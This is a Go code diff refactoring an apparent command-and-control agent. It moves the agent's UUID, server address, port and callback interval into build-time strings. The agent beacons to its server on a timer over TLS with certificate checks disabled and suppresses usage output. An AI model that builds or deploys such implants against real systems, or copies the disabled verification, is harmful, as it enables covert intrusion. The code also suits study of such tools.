@@ -29,28 +29,35 @@ import (
 	_ "github.com/mattn/go-sqlite3"
 )
 
-type agentInfoStruct struct {
-	ServerPublicKey string
-	AgentUUID       string
+type AgentInfoStruct struct {
+	AgentUUID         string
+	LocalAddress      net.TCPAddr
+	ServerAddress     net.TCPAddr
+	CallbackFrequency time.Duration
+	ServerPublicKey   string
 }
 
 var (
-	serverPublicKey string          = "555"
-	AgentUUID       string          = uuid.New().String()
-	agentInfo       agentInfoStruct = agentInfoStruct{ServerPublicKey: serverPublicKey, AgentUUID: AgentUUID}
+	AgentUUID string = uuid.New().String() // set during compilation
+
+	LocalPortString string = "1337" // set during compilation
+	localPort       int
+	localAddress    net.TCPAddr
+	// testing: localAddress      net.TCPAddr   = net.TCPAddr{Port: LocalPort}
+
+	ServerIP         string = "127.0.0.1" // set during compilation
+	ServerPortString string = "444"       // set during compilation
+	serverPort       int
+	serverAddress    net.TCPAddr
+	serverPublicKey  string = "555"
+
+	CallbackFrequencyMinutesString string = "1" // set during compilation
+	callbackFrequencyMinutes       time.Duration
+
+	agentInfo AgentInfoStruct
 	// testing: AgentUUID, _                 = uuid.Parse("ef1a6a78-0d95-490a-a07f-9607e00b96ce")
 
-	LocalPort    int         = 1337
-	localAddress net.TCPAddr = net.TCPAddr{IP: net.ParseIP("127.0.0.1"), Port: LocalPort}
-	//localAddress      net.TCPAddr   = net.TCPAddr{Port: LocalPort}
-
-	ServerIP      string      = "127.0.0.1"
-	ServerPort    int         = 444
-	serverAddress net.TCPAddr = net.TCPAddr{IP: net.ParseIP(ServerIP), Port: ServerPort}
-
-	tlsConfig                tls.Config    = tls.Config{InsecureSkipVerify: true}
-	CallbackFrequencyMinutes int           = 1
-	callbackFrequencyTime    time.Duration = time.Duration(CallbackFrequencyMinutes) * time.Minute
+	tlsConfig tls.Config = tls.Config{InsecureSkipVerify: true}
 )
 
 func callback() {
@@ -58,7 +65,7 @@ func callback() {
 
 	// TODO: Allow for custom local port to be specified, currently unsure how to do this.
 	// Can do it with net.Dial(), but there's no option in tls.Dial()
-	conn, err := tls.Dial("tcp", ServerIP+":"+fmt.Sprint(ServerPort), &tlsConfig)
+	conn, err := tls.Dial("tcp", ServerIP+":"+ServerPortString, &tlsConfig)
 	//conn, err := net.DialTCP("tcp", &localAddress, &serverAddress)
 	if err != nil {
 		return
@@ -86,7 +93,7 @@ func testServer() {
 
 	// TODO: Allow for custom local port to be specified, currently unsure how to do this.
 	// Can do it with net.Dial(), but there's no option in tls.Dial()
-	conn, err := tls.Dial("tcp", ServerIP+":"+fmt.Sprint(ServerPort), &tlsConfig)
+	conn, err := tls.Dial("tcp", ServerIP+":"+ServerPortString, &tlsConfig)
 	if err != nil {
 		utils.LogError(utils.Error, err, "Could not connect to server")
 		os.Exit(utils.ERR_CONNECTION)
@@ -119,17 +126,23 @@ func testServer() {
 	*/
 }
 
-func (info agentInfoStruct) printAgentInfo() {
-	data := []string{info.ServerPublicKey, info.AgentUUID}
+func (info AgentInfoStruct) printAgentInfo() {
+	data := []string{info.AgentUUID, info.LocalAddress.String(), info.ServerAddress.String(), info.CallbackFrequency.String(), info.ServerPublicKey}
 
 	table := tablewriter.NewWriter(os.Stdout)
-	table.SetHeader([]string{"Server Public Key", "Agent UUID"})
+	table.SetHeader([]string{"Agent UUID", "Local Address", "ServerAddress", "Callback Frequency", "Server Public Key"})
 	table.SetAlignment(tablewriter.ALIGN_LEFT)
 	table.SetHeaderColor(
 		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiRedColor},
 		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiRedColor},
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiRedColor},
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiRedColor},
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiRedColor},
 	)
 	table.SetColumnColor(
+		tablewriter.Colors{tablewriter.FgRedColor},
+		tablewriter.Colors{tablewriter.FgRedColor},
+		tablewriter.Colors{tablewriter.FgRedColor},
 		tablewriter.Colors{tablewriter.FgRedColor},
 		tablewriter.Colors{tablewriter.FgRedColor},
 	)
@@ -141,6 +154,21 @@ func (info agentInfoStruct) printAgentInfo() {
 }
 
 func main() {
+	// Set up variables
+	_, err := fmt.Sscan(LocalPortString, &localPort)
+	utils.CheckErrorExit(utils.Error, err, utils.ERR_SCAN, "Could not parse LocalPortString as integer")
+	localAddress = net.TCPAddr{IP: net.ParseIP("127.0.0.1"), Port: localPort}
+
+	_, err = fmt.Sscan(CallbackFrequencyMinutesString, &callbackFrequencyMinutes)
+	utils.CheckErrorExit(utils.Error, err, utils.ERR_SCAN, "Could not parse CallbackFrequencyMinutesString as integer")
+	callbackFrequencyMinutes = time.Duration(callbackFrequencyMinutes) * time.Minute
+
+	_, err = fmt.Sscan(ServerPortString, &serverPort)
+	utils.CheckErrorExit(utils.Error, err, utils.ERR_SCAN, "Could not parse ServerPortString as integer")
+	serverAddress = net.TCPAddr{IP: net.ParseIP(ServerIP), Port: serverPort}
+
+	agentInfo = AgentInfoStruct{AgentUUID: AgentUUID, LocalAddress: localAddress, ServerAddress: serverAddress, CallbackFrequency: callbackFrequencyMinutes, ServerPublicKey: serverPublicKey}
+
 	// Intentionally not using the "flag" package because we never want to print usage information
 	single := false
 	if len(os.Args) > 1 { // contains a command-line flag
@@ -163,7 +191,7 @@ func main() {
 
 	// Call back to server according to the callback frequency in minutes
 	if !single {
-		for range time.Tick(callbackFrequencyTime) {
+		for range time.Tick(callbackFrequencyMinutes) {
 			callback()
 		}
 	}
